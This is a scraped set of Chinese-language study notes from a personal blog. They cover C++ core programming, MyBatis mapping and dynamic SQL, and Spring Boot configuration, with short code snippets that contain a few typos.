7 //2、函数的调用可以作为左值 int\u0026amp; test02( { staticinta=10;//静态变量，存放在全局区，全局区上的数据在程序结束后系统释放 return a; } test02() = 1000 // 支持 引用的本质 本质是指针常量，由编译器转换为指针\n1 2 3 //自动转换为 int*constref=\u0026amp;a；指针常量是指针指向不可改，也说明为什么引用不可更改 int\u0026amp; ref=a; ref = 20；//内部发现 ref 是引用，自动帮我们转换为：*ref=20； 常量引用 1 2 3 4 5 //常量引用 //使用场景：用来修饰形参，防止误操作 //int\u0026amp; a = 10; 这行错误，非法空间 //加上const之后编译器将代码修改int temp = 10;const int \u0026amp;rettemp; const int\u0026amp; ref=10；//引用必须引一块合法的内存空间 函数 默认参数 C++中，函数的形参列表中的形参是可以有默认值的\n1 2 3 int func(int a,int b = 20 ， int c = 30){ return a + b + c; } 如果某个位置已经有了默认参数，那么从这个位置往后，从左到右都必须有默认值 如果函数声明有默认参数，函数实现就不能有默认参数 占位参数 1 2 3 4 //函数占位参数，占位参数也可以有默认参数 void func（int a，int）{ cout\u0026lt;\u0026lt;“thisisfunc\u0026#34;\u0026lt;\u0026lt;endl; } 重载 作用：函数名可以相同，提高复用性\n函数重载满足条件：\n同一个作用域下 函数名称相同 函数参数类型不同或者个数不同或者顺序不同 返回值不同不可以作为条件 注意 引用作为重载条件\n以 const 为标志的区分，是否可写 数重载碰到函数默认参数\n出现二义性，报错 类和对象 封装 意义：\n属性和行为作为一个整体，表现生活中的事物 属性和行为加以权限控制 语法：class 类名 { 访问权限：属性/行为 }；\n1 2 3 4 5 6 7 8 9 10 class circle { public: int r; double calculateC(){ return 2 * PI * r; } } Circle c1; // 实例化 c1.r = 10; // 给属性赋值 类中的属性和行为统一称为成员\n成员属性 \u0026ndash;\u0026gt; 成员变量 成员函数 \u0026ndash;\u0026gt; 成员方法 访问权限 public：类内可以访问，类外可以访问\nprotected：类内可以访问，类外不可以访问，继承类可访问\nprivate：类内可以访问，类外不可以访问。\nStruct 和 Class 唯一的区别就在于默认的访问权限不同\nstruct 默认权限为公共 class 默认权限为私有 成员属性私有化 优点：\n所有成员属性设置为私有，可以自己控制读写权限 对于写权限，我们可以检测数据的有效性 用 set 、get 方法控制权限、操作\n对象的初始化和清理 构造函数和析构函数 构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。\n没有返回值也不写void 函数名称与类名相同 类名(){} 构造函数可以有参数，因此可以发生重载 程序在调用对象时候会自动调用构造，无须手动调用，而且只会调用一次 析构函数：主要作用在于对象销毁前系统自动调用，执行一些清理工作。\n没有返回值也不写void 函数名称与类名相同，在名称前加上符号 ~ 析构函数不可以有参数，因此不可以发生重载 程序在对象销毁前会自动调用析构，无须手动调用，而且只会调用一次 构造函数分类与调用 分类：\n按参数分为：有参构造和无参构造 使用默认无参构造时，不要加括号，否则会认为是函数声明 按类型分为：普通构造和拷贝构造 不要用拷贝构造函数初始化匿名对象，编译器会认为 Person(p3) === Person p3 1 2 3 4 //拷贝构造函数 Person(const Person\u0026amp; p）{ age =p.age; } 调用方式：括号法，显式法，隐式转换法\n1 2 3 4 //1、括号法 Person p1；//默认构造函数调用 Person p2(10)；//有参构造函数 Person p(p2)；//拷贝构造函数 1 2 3 4 5 //2、显示法 Person p1; //不能加括号 Person p2=Person(10)；//有参构造 Person p3=Person（p2）；//拷贝构造 Person(10)；//匿名对象特点：当前行执行结束后，系统会立即回收掉匿名对象 1 2 3 //3、隐式转换法 Person p4 = 10;//相当于写了Person p4 =Person(10);有参构造 Person p5 = p4;// 拷贝构造 拷贝构造函数的调用时机 使用一个已经创建完毕的对象来初始化一个新对象 传递的方式给函数参数传值 值方式返回局部对象 在函数内部创建的对象被返回时，会创建一个新的对象返回 拷贝构造函数的调用规则 默认情况下，C++编译器至少给一个类添加3个函数：\n默认构造函数（无参，函数体为空） 默认析构函数(无参，函数体为空) 认拷贝构造函数，对属性进行值拷贝 定义有参构造函数，C++ 不再提供默认无参构造，但是会提供默认拷贝构造\n定义拷贝构造函数，C++ 不会再提供其他构造函数\n深浅拷贝 浅：简单的赋值拷贝\n默认提供的是浅拷贝 深：在堆内存重新创建一块内存，进行拷贝\n涉及到申请堆区时，需要深拷贝 初始化列表 1 2 3 4 5 //初始化列表初始化属性 Person(int a, int b,int c) :m_A(a),m_B(b), m_C(c) { ... } 类作为类成员 当类有嵌套时，会先构造内部对象，析构顺序与构造相反\n静态成员 静态成员变量：\n所有对象共享同一份数据 在编译阶段分配内存 类内声明，类外初始化 静态成员函数：\n所有对象共享同一个函数 只能访问静态成员变量 因为调用函数时，无法定位非静态成员变量（属于特定对象） 可以通过对象，也可以直接通过类名访问，有访问权限\n内存模型和 this 指针 内存：\n类内的成员变量和成员函数分开存储\n只有非静态成员变量才属于类的对象上\nthis 指针：\n指向被调用的成员函数所属的对象，隐含在每一个非静态成员函数内 当形参和成员变量同名时，可用this指针来区分 this -\u0026gt; name 在类的非静态成员函数中返回对象本身，可使用 return *this 实现链式编程 1 2 3 4 5 6 Person\u0026amp; PersonAddAge(Person \u0026amp;p) { this-\u0026gt;age += p.age; //this指向p2的指针，而*this指向的就是p2这个对象本体 return *this; } 注意返回 Person**\u0026amp;**，值返回会调用拷贝函数创建一个新的对象\n空指针访问成员函数 1 2 3 Person * p = NULL; p-\u0026gt;showClassName (); // 只要所调用的函数中没有使用到 this 即可(包含隐含的 this，用于访问属性) const 修饰成员函数 常函数：\n成员函数后加const后我们称为这个函数为常函数\n常函数内不可以修改成员属性\n成员属性声明时加关键字mutable后，则在常函数中也可以修改\n1 2 3 4 5 6 //this指针的本质是指针常量指针的指向是不可以修改的 const Person * const this; // 设置指针指向的值也无法修改 void showPersonO() const{ this-\u0026gt;m_A = 100; } //this=NULL； //this指针不可以修改指针的指向 常对象：\n声明对象前加const称该对象为常对象 对象只能调用常函数 友元 使一个函数或者类访问另一个类中私有成员，关键字friend\n三种实现：\n局函数做友元 类做友元 成员函数做友元 friend void clazz::method(); 在类中声明 friend，被声明的可以访问本类的私有属性\n运算符重载 定义自定义类型的运算方式\n成员函数重载：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //1、成员函数重载+号，本质调用：Person p3 =pl.operator+(p2); Person operator+(Person \u0026amp;p) { Person temp; temp.m_A=this-\u0026gt;m_A +p.m_A； temp.m_B =Ithis-\u0026gt;m_B +p.m_B; return temp; } //2、全局函数重载+号,本质调用：Person p3 = operator+(pl,p2); Person operator+(Person \u0026amp;pl,Person \u0026amp;p2) { Person temp; temp.m_A =pl.m_A +p2.m_A; temp.m_B=pl.m_B+p2.m_B; return temp; } 左移 只能通过全局函数重载\n1 2 3 4 5 6 //只能利用全局函数重载左移运算符 void operator\u0026lt;\u0026lt;(ostream \u0026amp;cout,Person \u0026amp;p)//本质: operate\u0026lt;\u0026lt; (cout,p) { cout \u0026lt;\u0026lt; p.name; return cout; } 递增 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 //重载前置++运算符返回引用为了一直对一个数据进行递增操作 MyInteger\u0026amp; operator++() { //先进行++运算 m_Num++; //再将自身做返回 return *this; } //重载后置++运算符 //void operator++(int) int代表占位参数，可以用于区分前置和后置递增 MyInteger operator++(int) { //先记录当时结果 MyInteger temp = *this; //后递增 m_Num++; 7/最后将记录结果做返回 return temp; } 赋值 默认实现为浅拷贝，p1 = p2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 重载赋值运算符 Person\u0026amp; operator=(Person \u0026amp;p) { if (m_Age != NULL) { delete m_Age; m_Age = NULL; } // 编译器提供的代码是浅拷贝 // m_Age = p.m_Age; // 提供深拷贝 解决浅拷贝的问题 m_Age = new int(*p.m_Age); // 返回自身 return *this; } 注意：返回引用，可以操作自身；返回值，会拷贝出一个对象。目的是为了实现连等\n关系 1 2 3 4 5 6 7 8 9 10 11 bool operator==(Person \u0026amp;p) { if (this-\u0026gt;m_Name == p.m_Name \u0026amp;\u0026amp; this-\u0026gt;m_Age == p.m_Age) { return true; } else { return false; } } 函数调用 （） 仿函数\n非常灵活 1 2 3 4 5 //重载函数调用运算符 void operator() (string test) { cout\u0026lt;\u0026lt; test \u0026lt;\u0026lt; endl; } 继承 下级别的成员除了拥有上一级的共性，还有自己的特性，抽取出父、子\n用于减少重复代码 1 2 3 4 class son : public father { ... } 继承方式 向下压级，私有被隐藏，但还是会继承\n继承的对象模型 父类中所有非静态成员属性都会被子类继承下去\n构造、析构顺序 子类继承父类后，当创建子类对象，也会调用父类的构造函数\n先有父，后有子；析构相反 同名成员处理 父类加作用域 s.base::func(); 只要子类有同名，父类函数全都被隐藏（重载也不行） 子类直接访问 同名静态成员 静态成员和非静态成员出现同名，处理方式一致\n多继承 class son: type fa1,type fa2\n不建议，父类命名可能重复\n菱形继承 一出二，二合一\n孙类继承了两份父类的相同数据，产生冗余\n利用虚继承解决菱形继承\n1 2 3 4 5 6 7 8 9 //利用虚继承解决菱形继承的问题 //继承之前加上关键字virtual变为虚继承 //Anima1类称为虚基类 [//羊类 class Sheep0:virtual public Animal{}： //驼类 class Tuo :virtual public Animal{}; //羊驼类 class SheepTuo :public ISheep, public Tuo{}; 多态 基本概念 多态分为两类\n静态多态：函数重载和运算符重载属于静态多态，复用函数名 动态多态：派生类和虚函数实现运行时多态 有派生类时，动态绑定子类重写的虚函数（父类指针指向子类对象） 静态多态和动态多态区别：\n静态多态的函数地址早绑定－编译阶段确定函数地址 动态多态的函数地址晚绑定－运行阶段确定函数地址 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Animal { public: //Speak函数就是虚函数 //函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。 virtual void speak() { cout \u0026lt;\u0026lt; \u0026#34;动物在说话\u0026#34; \u0026lt;\u0026lt; endl; } }; class Cat :public Animal { public: void speak() { cout \u0026lt;\u0026lt; \u0026#34;小猫在说话\u0026#34; \u0026lt;\u0026lt; endl; } }; 原理：\n子类重写父类虚函数时：子类中的虚函数表内部会替换成子类的虚函数地址 优点：\n满足“开闭原则” 扩展对外开放，修改对外关闭\n组织结构清晰，可读性强 可维护性强 纯虚函数和抽象类 virtual 返回值类型 函数名（参数列表）= θ；\n当类中有了纯虚函数，这个类也称为抽象类\n抽象类无法实例化 子类必须重写父类的纯虚函数，否则子类也是抽象类 虚析构与纯虚析构 共性：\n解决父类指针释放子类对象 原因：父类指针指向子类对象，delete 的时候只调用父类的析构函数 都需要有具体的函数实现 差异：\n如果是纯虚析构，该类属于抽象类，无法实例化对象 虚析构函数需要被实现 若堆中没有数据，可以不写\n文件操作 文本文件 文件以 ASCII 码存储\n操作文件的三大类：\nofstream：写操作 ifstream：读操作 fstream：读写操作 写文件 步骤：\n包含头文件 #include \u0026lt;fstream\u0026gt; 创建流对象 ofstream ofs; 打开文件 ofs.open(\u0026quot;文件路径\u0026quot;,打开方式); 写数据 ofs\u0026lt;\u0026lt;\u0026quot;写入的数据\u0026quot;; 关闭文件ofs.close() 二进制 ios::binary\n","date":"2025-10-13T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-c++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/","title":"C++ 核心编程"},{"content":"Mybatis 介绍 轻量级，性能出色 封装 JDBC SQL 和 Java 编码分开，功能边界清晰。Java 代码专注业务、SQL 语句专注数据 官网：https://mybatis.org/mybatis-3/zh/# 使用 创建SpringBoot工程、引入Mybatis相关依赖\n准备数据库表即对应实体类\n配置 Mybatis（在application.properties中数据库连接信息）\n编写 Mybatis 程序：编写 Mybatis 的持久层接口，定义 SQL（注解/XML）\n@Mapper：应用程序在运行时，会自动的为该接口创建一个实现类对象（代理对象），并且会自动将该实现类对象存入I0C容器 辅助配置 定义注解的语句为 MySQL 语法\nIDEA 连接数据库\n日志\n1 2 #配置mybatis的日志输出 mybatis.configuration.logimpl=org.apache.ibatis.logging.stdout.StdoutImpl 数据库连接池 数据库连接池是个容器，负责分配、管理数据库连接（Connection） 资源重用 允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个 提升系统响应速度 释放空闲时间超过最大空闲时间的连接，来避免因为没有释放连接而引起的数据库连接遗漏 避免数据库连接遗漏 1 2 3 4 5 6 // 引入德鲁伊连接池 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;druid-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.19\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; spring.datasource.type=com.alibaba.druid.pool.DruidDataSource\n底层实现 DataSource 接口\n操作 新增 1 2 @Insert(\u0026#34;insert insert(username,password,name,age) values (#{username},#{password},#{name},#{age})\u0026#34;) // 写的是对象属性名 public void insert(User user2); 删除 1 2 3 @Delete(\u0026#34;delete from user where id = #{id}\u0026#34;) public Integer deleteById(Integer id); // 可以返回影响的行数 修改 1 2 @Update(\u0026#34;update user set username=#{username}, password=#{password}, name=#{name}, age=#{age} where id=#{id}\u0026#34;) public void update(User user); 查询 1 2 @Select(\u0026#34;select * from user where username=#{username} and password=#{password}\u0026#34;) public User findByUsernameAndPassword(@Param(\u0026#34;username\u0026#34;) String username, @Param(\u0026#34;password\u0026#34;) String password); 有多个参数时，需要 @param 注解 XML 映射配置 默认规则：\nXML 映射文件的名称与 Mapper 接口名称一致，并且将 XML 映射文件和 Mapper 接口放置在相同包下（ resource 中同包同名）。\nXML 映射文件的 namespace 属性为 Mapper 接口全限定名一致。\n1 2 3 4 5 \u0026lt;mapper namespace=\u0026#34;com.itheima.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;findAll\u0026#34; resultType=\u0026#34;com.itheima.pojo.User\u0026#34;\u0026gt; select id，username，password，name，age from user \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; XML 映射文件中 sql 语句的 id 与 Mapper 接口中的方法名一致，并保持返回类型一致。 动态 SQL IF 1 2 3 4 5 6 7 8 9 \u0026lt;select id=\u0026#34;selectAllWebsite\u0026#34; resultMap=\u0026#34;myResult\u0026#34;\u0026gt; select id,name,url from website where 1=1 \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt; AND name like #{name} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;url!= null\u0026#34;\u0026gt; AND url like #{url} \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; choose-when-otherwise 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;mapper namespace=\u0026#34;net.biancheng.mapper.WebsiteMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; parameterType=\u0026#34;net.biancheng.po.Website\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; SELECT id,name,url,age,country FROM website WHERE 1=1 \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;name != null and name !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND name LIKE CONCAT(\u0026#39;%\u0026#39;,#{name},\u0026#39;%\u0026#39;) \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;url != null and url !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND url LIKE CONCAT(\u0026#39;%\u0026#39;,#{url},\u0026#39;%\u0026#39;) \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; AND age is not null \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 注意：AND 不能省！\nWHERE where 会检索语句，它会将 where 后的第一个 SQL 条件语句的 AND 或者 OR 关键词去掉。\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; select id,name,url from website \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt; AND name like #{name} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;url!= null\u0026#34;\u0026gt; AND url like #{url} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; SET set 标签可以为 SQL 语句动态的添加 set 关键字，剔除追加到条件末尾多余的逗号\n1 2 3 4 5 6 7 8 9 \u0026lt;update id=\u0026#34;updateWebsite\u0026#34; parameterType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; UPDATE website \u0026lt;set\u0026gt; \u0026lt;if test=\u0026#34;name!=null\u0026#34;\u0026gt;name=#{name}\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;url!=null\u0026#34;\u0026gt;url=#{url}\u0026lt;/if\u0026gt; \u0026lt;/set\u0026gt; WHERE id=#{id} \u0026lt;/update\u0026gt; foreach foreach 标签用于循环语句，它很好的支持了数据和 List、set 接口的集合，并对此提供遍历的功能\n1 2 3 \u0026lt;foreach item=\u0026#34;item\u0026#34; index=\u0026#34;index\u0026#34; collection=\u0026#34;list|array|map key\u0026#34; open=\u0026#34;(\u0026#34; separator=\u0026#34;,\u0026#34; close=\u0026#34;)\u0026#34;\u0026gt; 参数值 \u0026lt;/foreach\u0026gt; foreach 标签主要有以下属性，说明如下。\nitem：表示集合中每一个元素进行迭代时的别名。 index：指定一个名字，表示在迭代过程中每次迭代到的位置。 open：表示该语句以什么开始（既然是 in 条件语句，所以必然以(开始）。 separator：表示在每次进行迭代之间以什么符号作为分隔符（既然是 in 条件语句，所以必然以,作为分隔符）。 close：表示该语句以什么结束（既然是 in 条件语句，所以必然以)开始）。 使用 foreach 标签时，最关键、最容易出错的是 collection 属性，该属性是必选的，但在不同情况下该属性的值是不一样的，主要有以下 3 种情况：\n如果传入的是单参数且参数类型是一个 List，collection 属性值为 list。 如果传入的是单参数且参数类型是一个 array 数组，collection 的属性值为 array。 如果传入的参数是多个，需要把它们封装成一个 Map，当然单参数也可以封装成 Map。Map 的 key 是参数名，collection 属性值是传入的 List 或 array 对象在自己封装的 Map 中的 key。 trim trim 一般用于去除 SQL 语句中多余的 AND 关键字、逗号，或者给 SQL 语句前拼接 where、set 等后缀，可用于选择性插入、更新、删除或者条件查询等操作\n1 2 3 \u0026lt;trim prefix=\u0026#34;前缀\u0026#34; suffix=\u0026#34;后缀\u0026#34; prefixOverrides=\u0026#34;忽略前缀字符\u0026#34; suffixOverrides=\u0026#34;忽略后缀字符\u0026#34;\u0026gt; SQL语句 \u0026lt;/trim\u0026gt; bind bind 标签可以通过 OGNL 表达式自定义一个上下文变量\n1 2 3 4 5 6 \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; \u0026lt;bind name=\u0026#34;pattern\u0026#34; value=\u0026#34;\u0026#39;%\u0026#39;+_parameter+\u0026#39;%\u0026#39;\u0026#34; /\u0026gt; SELECT id,name,url,age,country FROM website WHERE name like #{pattern} \u0026lt;/select\u0026gt; 实现分页 使用 limit：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; SELECT id,name,url,age,country FROM website \u0026lt;trim prefix=\u0026#34;where\u0026#34; prefixOverrides=\u0026#34;and\u0026#34;\u0026gt; \u0026lt;if test=\u0026#34;site.name != null and site.name !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND name LIKE CONCAT (\u0026#39;%\u0026#39;,#{site.name},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;site.url!= null and site.url !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND url LIKE CONCAT (\u0026#39;%\u0026#39;,#{site.url},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; ORDER BY id limit #{from},#{pageSize} \u0026lt;/trim\u0026gt; \u0026lt;/select\u0026gt; 逆向工程 导入依赖： 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; config 文件夹下创建 genertorConfig.xml 文件，用于配置及指定数据库及表等 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE generatorConfiguration PUBLIC \u0026#34;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\u0026#34;\u0026gt; \u0026lt;generatorConfiguration\u0026gt; \u0026lt;context id=\u0026#34;DB2Tables\u0026#34; targetRuntime=\u0026#34;MyBatis3\u0026#34;\u0026gt; \u0026lt;commentGenerator\u0026gt; \u0026lt;!-- 是否去除自动生成的注释 --\u0026gt; \u0026lt;property name=\u0026#34;suppressAllComments\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/commentGenerator\u0026gt; \u0026lt;!-- Mysql数据库连接的信息：驱动类、连接地址、用户名、密码 --\u0026gt; \u0026lt;jdbcConnection driverClass=\u0026#34;com.mysql.jdbc.Driver\u0026#34; connectionURL=\u0026#34;jdbc:mysql://localhost:3306/test\u0026#34; userId=\u0026#34;root\u0026#34; password=\u0026#34;root\u0026#34; /\u0026gt; \u0026lt;!-- 默认为false，把JDBC DECIMAL 和NUMERIC类型解析为Integer，为true时 把JDBC DECIMAL 和NUMERIC类型解析为java.math.BigDecimal --\u0026gt; \u0026lt;javaTypeResolver\u0026gt; \u0026lt;property name=\u0026#34;forceBigDecimals\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/javaTypeResolver\u0026gt; \u0026lt;!-- targetProject：生成POJO类的位置 --\u0026gt; \u0026lt;javaModelGenerator targetPackage=\u0026#34;net.biancheng.pojo\u0026#34; targetProject=\u0026#34;.\\src\u0026#34;\u0026gt; \u0026lt;!-- enableSubPackages:是否让schema作为包的后缀 --\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;!-- 从数据库返回的值被清理前后的空格 --\u0026gt; \u0026lt;property name=\u0026#34;trimStrings\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaModelGenerator\u0026gt; \u0026lt;!-- targetProject：mapper映射文件生成的位置 --\u0026gt; \u0026lt;sqlMapGenerator targetPackage=\u0026#34;net.biancheng.mapper\u0026#34; targetProject=\u0026#34;.\\src\u0026#34;\u0026gt; \u0026lt;!-- enableSubPackages:是否让schema作为包的后缀 --\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/sqlMapGenerator\u0026gt; \u0026lt;!-- targetProject：mapper接口生成的的位置 --\u0026gt; \u0026lt;javaClientGenerator type=\u0026#34;XMLMAPPER\u0026#34; targetPackage=\u0026#34;net.biancheng.mapper\u0026#34; targetProject=\u0026#34;.\\src\u0026#34;\u0026gt; \u0026lt;!-- enableSubPackages:是否让schema作为包的后缀 --\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/javaClientGenerator\u0026gt; \u0026lt;!-- 指定数据表 --\u0026gt; \u0026lt;table tableName=\u0026#34;website\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;table tableName=\u0026#34;student\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;table tableName=\u0026#34;studentcard\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;table tableName=\u0026#34;user\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;/context\u0026gt; \u0026lt;/generatorConfiguration\u0026gt; 创建 GeneratorSqlmap 类执行生成代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class GeneratorSqlmap { public void generator() throws Exception { List\u0026lt;String\u0026gt; warnings = new ArrayList\u0026lt;String\u0026gt;(); boolean overwrite = true; // 指定配置文件 File configFile = new File(\u0026#34;./config/generatorConfig.xml\u0026#34;); ConfigurationParser cp = new ConfigurationParser(warnings); Configuration config = cp.parseConfiguration(configFile); DefaultShellCallback callback = new DefaultShellCallback(overwrite); MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings); myBatisGenerator.generate(null); } // 执行main方法以生成代码 public static void main(String[] args) { try { GeneratorSqlmap generatorSqlmap = new GeneratorSqlmap(); generatorSqlmap.generator(); } catch (Exception e) { e.printStackTrace(); } } } ","date":"2025-10-12T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251012201626030.png","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-mybatis/","title":"Mybatis"},{"content":"SpringBoot 简介 设计目的：简化Spring应用的初始搭建以及开发过程\nSpring 程序缺点\n依赖设置繁琐 去除 spring-web 和 spring-webmvc 坐标 配置繁琐 SpringBoot 核心功能及优点：\n起步依赖（简化依赖配置）\n自动配置\n辅助功能（内置服务器）\nparent 管理版本 由 parent 帮助开发者统一的进行各种技术的版本管理\n只控制版本，不负责导入坐标 1 2 3 4 5 \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.4\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; starter 依赖组合 starter定义了使用某种技术时对于依赖的固定搭配格式，使用starter可以帮助开发者减少依赖配置。\n引导类 这个类在SpringBoot程序中是所有功能的入口，称为引导类，最典型的特征就是当前类上方声明了一个注解 @SpringBootApplication。\n用于启动程序 创建并初始化 Spring 容器 内嵌 Tomcat 整合到了：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-tomcat\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 基础配置 默认配置文件：application.properties，配置指定属性即可\n配置文件间的加载优先级 properties（最高）\u0026gt; yml \u0026gt; yaml（最低） 不同配置文件中相同配置按照加载优先级相互覆盖，不同配置文件中不同配置全部保留 指定SpringBoot配置文件\nSetting → Project Structure → Facets 选中对应项目/工程 Customize Spring Boot 选择配置文件 YML 数据读取 使用Spring中的注解 @Value读取单个数据\n1 2 @Value(\u0026#34;${server.port}\u0026#34;) private int port; 使用默认配置类 SpringBoot 提供了一个对象，能够把所有的数据都封装到这一个对象中，这个对象叫做 Environment，使用自动装配注解可以将所有的yaml数据封装到这个对象中\n1 2 3 4 @Autowired private Environment env; ... env.getProperty(\u0026#34;...\u0026#34;); 使用自定义配置类 SpringBoot 也提供了可以将一组 yaml 对象数据封装一个 Java 对象的操作\nenterprise 指定加载某一组 yaml 配置\n1 2 3 4 5 6 7 @Component @ConfigurationProperties(prefix = \u0026#34;enterprise\u0026#34;) public class Enterprise { private String name; private Integer age; private String[] subject; } 数据引用 1 2 3 4 5 6 baseDir: /usr/local/fire center: dataDir: ${baseDir}/data tmpDir: ${baseDir}/tmp logDir: ${baseDir}/log msgDir: ${baseDir}/msgDir SSMP 整合 JUnit 1 2 3 4 5 6 7 8 9 10 11 12 13 @SpringBootTest(classes = Springboot04JunitApplication.class) // @ContextConfiguration(classes = Springboot04JunitApplication.class) class Springboot04JunitApplicationTests { //注入你要测试的对象 @Autowired private BookDao bookDao; @Test void contextLoads() { //执行要测试的对象对应的方法 bookDao.save(); System.out.println(\u0026#34;two...\u0026#34;); } } Mybatis 在配置、引入依赖时已经整合\n1 2 3 4 5 @Mapper public interface BookDao { @Select(\u0026#34;select * from tbl_book where id = #{id}\u0026#34;) public Book getById(Integer id); } 1 2 3 4 5 6 7 #2.配置相关信息 spring: datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=Asia/Shanghai username: root password: root Mybatis-plus 需要用阿里云的 url 导入\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.baomidou\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-plus-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.4.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 配置所有数据库表名的前缀名：\n1 2 3 4 mybatis-plus: global-config: db-config: table-prefix: tbl_\t#设置所有表的通用前缀名称为tbl_ 其他 Lombok 简化POJO实体类开发，SpringBoot 目前默认集成了 lombok 